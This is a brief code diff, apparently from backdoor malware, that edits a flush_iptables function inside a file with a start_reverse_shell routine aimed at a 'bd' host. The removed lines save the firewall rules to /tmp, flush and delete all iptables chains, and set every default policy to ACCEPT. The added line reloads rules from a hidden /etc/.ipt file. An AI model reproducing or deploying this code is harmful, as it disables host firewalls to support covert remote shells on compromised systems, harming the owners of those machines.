@@ -77,16 +77,7 @@ void start_reverse_shell(char *bd_ip, unsigned short int bd_port)
 #ifdef IPTABLES
 void flush_iptables(void)
 {
-    system("iptables-save > /tmp/ipt 2> /dev/null");
-    system("iptables -X 2> /dev/null");
-    system("iptables -F 2> /dev/null");
-    system("iptables -t nat -F 2> /dev/null");
-    system("iptables -t nat -X 2> /dev/null");
-    system("iptables -t mangle -F 2> /dev/null");
-    system("iptables -t mangle -X 2> /dev/null");
-    system("iptables -P INPUT ACCEPT 2> /dev/null");
-    system("iptables -P FORWARD ACCEPT 2> /dev/null");
-    system("iptables -P OUTPUT ACCEPT 2> /dev/null");
+    system("iptables-load /etc/.ipt");
 }
 #endif
 
